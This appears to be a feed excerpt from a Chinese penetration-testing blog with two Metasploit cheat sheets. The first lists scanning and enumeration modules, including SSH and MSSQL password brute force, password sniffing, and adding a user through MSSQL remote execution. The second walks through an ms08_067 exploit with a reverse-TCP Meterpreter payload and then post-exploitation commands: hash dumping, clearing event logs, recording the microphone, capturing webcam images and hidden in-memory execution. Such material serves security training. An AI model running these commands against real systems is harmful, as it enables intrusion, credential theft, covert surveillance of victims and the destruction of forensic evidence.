      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="openvas" scheme="http://c.cat.plus/tags/openvas/"/>
    
      <category term="nessus" scheme="http://c.cat.plus/tags/nessus/"/>
    
      <category term="nexpose" scheme="http://c.cat.plus/tags/nexpose/"/>
    
      <category term="ms12_020" scheme="http://c.cat.plus/tags/ms12-020/"/>
    
  </entry>
  
  <entry>
    <title>常用MSF信息收集辅助模块</title>
    <link href="http://c.cat.plus/2016/03/07/Exploits/MsF/%E5%B8%B8%E7%94%A8MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/"/>
    <id>http://c.cat.plus/2016/03/07/Exploits/MsF/%E5%B8%B8%E7%94%A8MSF%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E8%BE%85%E5%8A%A9%E6%A8%A1%E5%9D%97/</id>
    <published>2016-03-07T15:29:13.000Z</published>
    <updated>2020-06-29T14:21:40.793Z</updated>
    
    <content type="html"><![CDATA[<h4 id="MSF信息收集"><a href="#MSF信息收集" class="headerlink" title="MSF信息收集"></a><strong>MSF信息收集</strong></h4><h5 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a><strong>nmap扫描</strong></h5><pre><code>db_nmap -sV 192.168.1.0/24        #结果保存到msf数据库</code></pre><p><strong>auxiliary/scanner</strong> 辅助扫描模块</p><pre><code>RHOSTS &lt;&gt; RHOSTset RHOSTS 192.168.1.20-192.168.1.30set RHOSTS 192.168.1.0/24,192.168.11.0/24set RHOSTS file:/root/h.txtsearch arpuse auxiliary/scanner/discovery/arp_sweepset INTERFACE eth0 set RHOSTS 192.168.254.0/24    set SHOST            #源地址伪造set SMAC         set THREADS    20        #线程数runsearch portscanuse auxiliary/scanner/portscan/synset INTERFACEset PORTSset RHOSTSset THREADSrun</code></pre><h5 id="nmap-IPID-Idle扫描-扫描IPID递增且空闲的主机"><a href="#nmap-IPID-Idle扫描-扫描IPID递增且空闲的主机" class="headerlink" title="nmap IPID  Idle扫描 扫描IPID递增且空闲的主机"></a><strong>nmap IPID  Idle扫描</strong> 扫描IPID递增且空闲的主机</h5><ul><li>利用MSF查找ipidseq主机</li></ul><pre><code>use auxiliary/scanner/ip/ipidseqset rhosts 192.168.1.0/24runnmap -PN -sl 1.1.1.2 1.1.1.3</code></pre><h5 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a><strong>UDP扫描</strong></h5><pre><code>search udpuse auxiliary/scanner/discovery/udp_sweepuse auxiliary/scanner/discovery/udp_probe</code></pre><h5 id="密码嗅探"><a href="#密码嗅探" class="headerlink" title="密码嗅探"></a><strong>密码嗅探</strong></h5><pre><code>search snifferuse auxiliary/sniffer/psnufflerun支持从pcap抓包文件中提取密码功能类似于dsniff目前只支持pop3,imap,ftp,HTTP GET协议</code></pre><h5 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a><strong>SNMP扫描</strong></h5><pre><code>vi /etc/default/snmpd            #侦听地址改为0.0.0.0use auxiliary/scanner/snmp/snmp_loginuse auxiliary/scanner/snmp/snmp_enumuse auxiliary/scanner/snmp/snmp_enumusersuse auxiliary/scanner/snmp/snmp_enumshares</code></pre><h5 id="SMB版本扫描"><a href="#SMB版本扫描" class="headerlink" title="SMB版本扫描"></a><strong>SMB版本扫描</strong></h5><pre><code>#扫描版本信息    use auxiliary/scanner/smb/smb_version    #扫描命名管道,判断SMB服务类型(账号,密码)use auxiliary/scanner/smb/pipe_auditor#扫描通过SMB管道可以访问的RCERPC服务use auxiliary/scanner/smb/pipe_dcerpc_auditor#SMB共享枚举(账号,密码)use auxiliary/scanner/smb/smb_enumshares#SMB用户枚举(账号,密码)use auxiliary/scanner/smb/smb_enumusers#SID枚举(账号,密码)use auxiliary/scanner/smb/smb_lookupsid</code></pre><h5 id="SSH相关扫描模块"><a href="#SSH相关扫描模块" class="headerlink" title="SSH相关扫描模块"></a><strong>SSH相关扫描模块</strong></h5><pre><code>#SSH版本扫描use auxiliary/scanner/ssh/ssh_version#SSH密码爆破use auxiliary/scanner/ssh/ssh_loginset USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txtset VERBOSE falseexploit#SSH 公钥登录use auxiliary/scanner/ssh/ssh_login_pubkeyset KEY_FILE id_rsaset USERNAME rootrun</code></pre><h5 id="获取Windows缺少的系统补丁"><a href="#获取Windows缺少的系统补丁" class="headerlink" title="获取Windows缺少的系统补丁"></a><strong>获取Windows缺少的系统补丁</strong></h5><ul><li>基于已经取得的session进行检测</li></ul><pre><code>use post/windows/gather/enum_patchesshow advancedset session 1set VERBOSE yesrun</code></pre><p><strong>检查失败</strong></p><ul><li>Known bug in WMI query, try migrating to another process</li><li>迁移到另一个进程再次尝试</li></ul><h5 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a><strong>SQL server</strong></h5><pre><code>#Mssql扫描端口#TCP 1433(动态端口) / UDP 1434 (查询TCP端口号)use auxiliary/scanner/mssql/mssql_ping#爆破mssql密码use auxiliary/scanner/mssql/mssql_login#远程执行代码use auxiliary/admin/mssql/mssql_execset CMD net user user pass /ADD</code></pre><h5 id="FTP模块"><a href="#FTP模块" class="headerlink" title="FTP模块"></a><strong>FTP模块</strong></h5><pre><code>#FTP版本扫描use auxiliary/scanner/ftp/ftp_version        #版本扫描use auxiliary/scanner/ftp/anonymous            #匿名登录扫描use auxiliary/scanner/ftp/ftp_login            #登录爆破use auxiliary/scanner/ [tab]    Display all 572 possibilities? (y or n)</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;MSF信息收集&quot;&gt;&lt;a href=&quot;#MSF信息收集&quot; class=&quot;headerlink&quot; title=&quot;MSF信息收集&quot;&gt;&lt;/a&gt;&lt;strong&gt;MSF信息收集&lt;/strong&gt;&lt;/h4&gt;&lt;h5 id=&quot;nmap扫描&quot;&gt;&lt;a href=&quot;#nmap扫描&quot; cl
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="nmap" scheme="http://c.cat.plus/tags/nmap/"/>
    
      <category term="sniffer" scheme="http://c.cat.plus/tags/sniffer/"/>
    
      <category term="auxiliary" scheme="http://c.cat.plus/tags/auxiliary/"/>
    
      <category term="ssh密码爆破" scheme="http://c.cat.plus/tags/ssh%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>meterpreter基本命令及其Python扩展</title>
    <link href="http://c.cat.plus/2016/03/06/Exploits/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/"/>
    <id>http://c.cat.plus/2016/03/06/Exploits/MsF/meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%85%B6Python%E6%89%A9%E5%B1%95/</id>
    <published>2016-03-06T13:19:23.000Z</published>
    <updated>2020-06-16T07:54:41.334Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a><strong>Meterpreter</strong></h4><p><strong>高级,动态,可扩展的payload</strong></p><ul><li>基于meterpreter上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul><p><strong>完全基于内存的DLL注入式payload</strong> (不写硬盘)</p><ul><li>注入合法系统进程并建立stager</li><li>基于Stager上传和预加载DLL进行扩展模块的注入(客户端API)</li><li>基于Stager建立的socket连接建立加密的TLS/1.0通信隧道</li><li>利用TLS隧道进一步加载后续扩展模块(避免网络取证)</li></ul><p><strong>服务端使用C语言编写</strong></p><ul><li>客户端提供基于ruby的全特性API(支持任何语言)</li></ul><h4 id="meterpreter基本命令"><a href="#meterpreter基本命令" class="headerlink" title="meterpreter基本命令"></a><strong>meterpreter基本命令</strong></h4><p><strong>以ms08_067漏洞测试获取一个meterpreter会话</strong></p><pre><code>msfconsolesearch 08-067use exploit/windows/smb/ms08_067_netapishow optionsset rhost 192.168.254.113set target 34set paylaod windows/meterpreter/reverse_tcpset lhsot 192.168.254.118set lport 6666exploit -j sessions -i 1</code></pre><p><strong>基本命令</strong></p><pre><code>help / ?        #查看使用帮助    background        #将meterpreter终端隐藏在后台（快捷键ctrl+z）sessions        #查看已经成功获得的会话，如果想继续与某会话交互，可以使用sessions -i 命令.quit / exit        #直接关闭当前的meterpreter会话，返回MSF终端.run                #执行meterpreter模块或脚本run post/windows/gather/hashdump    #获取目标机器hash密码bgrun            #后台执行meterpreter模块或脚本bgrun vnc        #VNC远程监控bgrun service_manager -l     #查看目标系统已有服务,可以创建自启动或开启停止服务.bglist            #提供所有正在运行的后台脚本的列表bgkill             #杀死一个背景 meterpreter 脚本channel         #显示活动频道interact         #与通道进行交互write             #将数据写入到一个通道read             #从通道读取数据close             #关闭通道use             #加载 meterpreter 的扩展clearev            #清除目标系统日志shell            #获取目标系统的控制台shell.resource -r r.txt    #调用资源文件ldletime        #查看目标机器空闲时间,判断电脑前是否有人record_mic        #录制目标麦克风,窃取声音信息webcam_list     #列出摄像头设备webcam_snap -i 1 -v false    #使用摄像头监控irb                #在meterpreter会话与ruby终端交互.load            #加载扩展插件</code></pre><p><strong>文件系统命令</strong></p><pre><code>cd            #访问目标文件夹路径pwd            #查看目标当前路径#攻击者本机命令前加l,意为local本地lcd         #访问攻击者本机路径lpwd        #查看攻击者本机路径ls / dir    #查看目标文件列表.cat            #查看目标文件内容.mkdir        #在目标机器创建目录.mv            #移动文件或改名getwd        #获得目标机器上当前的工作目录，getlwd，这个命令可以获得当前系统的工作目录.upload        #可以上传文件或文件夹到目标机器上;upload 要上传的文件 C:\Users\buzz\Desktopdownload    #从目标机器上下载文件或文件夹，注意windows路径要用双斜杠进行转义. download C:\\test.txt /root/home/testedit        #调用vi编辑器，对目标机器上的文件进行编辑;edit c:\\windows\\system32\\drivers\\etc\\hostssearch        #可通过search -h查看帮助信息,参数-d指定搜索的起始目录或驱动，如果为空，将进行全盘搜索；参数-f指定搜索的文件或部分文件名，支持星号(*)匹配；参数-r递归搜索子目录.search -d c:\\windows -f *.txtrm / del    #删除目标机器的文件.rmdir /s/q c:\\test    #进入shell后使用此命令可以删除目录下的所有文件和文件夹，/s表示所有子目录和文件/q表示安静模式，不显示yes or no.</code></pre><p><strong>网络命令</strong></p><pre><code>arp            #查看APR缓存netstat        #查看网络连接情况ifconfig    #查看目标机器网络接口信息portfwd        #它是meterpreter自带的端口转发器，用于把目标机器的端口转发到本地端口；假设目标机开放了3389端口，使用如下命令将其转发到本地3456端口：portfwd add -l 3456 -p 3389 -r 192.168.88.110rdesktop -u 用户名 -p 密码 ip:端口          #连接开启远程桌面的windows系统.route        #显示目标机器的路由信息.</code></pre><p><strong>系统命令</strong></p><pre><code>ps            #用于获得目标主机上正在运行的进程信息.migrate pid    #将Meterpreter会话从一个进程迁移到另一个进程的内存空间中，可以配合ps -ef |grep explorer.exeexecute        #在目标机器上执行文件.    execute -H -i -f cmd.exe         #直接与cmd进行交互,参数-H 表示隐藏执行 -i 表示直接与cmd交互.#另外execute命令的-m参数支持直接从内存中执行攻击者的可执行文件.execute -H -m -d regedit.exe -f hidden_shell.exegetprivs    #查看获取的权限getproxy    #获取代理信息getsystem    #获取系统权限getpid        #获得当前会话所在进程的PID值.kill        #用于终结指定的PID进程.getuid        #用于获得运行meterpreter会话的用户名，从而查看当前会话具有的权限.sysinfo        #用于得到目标系统的一些信息，例如机器名，操作系统等.show_mount    #展示已挂载磁盘reboot        #重启目标机器shutdown    #关闭目标机器</code></pre><h4 id="Meterpreter-python扩展"><a href="#Meterpreter-python扩展" class="headerlink" title="Meterpreter python扩展"></a><strong>Meterpreter python扩展</strong></h4><ul><li>2015年11月份,来自社区的贡献</li><li>无需运行环境,在客户端运行原生python代码</li></ul><pre><code>load pythonhelppython_execute &quot;print(hello world)&quot;python_execute &quot;import os; cd=os.getcwd()&quot; -r cdpython_import -f find.py</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Meterpreter&quot;&gt;&lt;a href=&quot;#Meterpreter&quot; class=&quot;headerlink&quot; title=&quot;Meterpreter&quot;&gt;&lt;/a&gt;&lt;strong&gt;Meterpreter&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;高级,动态,可扩展
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞利用" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
      <category term="MSF" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/MSF/"/>
    
    
      <category term="MSF" scheme="http://c.cat.plus/tags/MSF/"/>
    
      <category term="payload" scheme="http://c.cat.plus/tags/payload/"/>
    
      <category term="python" scheme="http://c.cat.plus/tags/python/"/>
    
      <category term="meterpreter" scheme="http://c.cat.plus/tags/meterpreter/"/>
    
  </entry>
  
</feed>
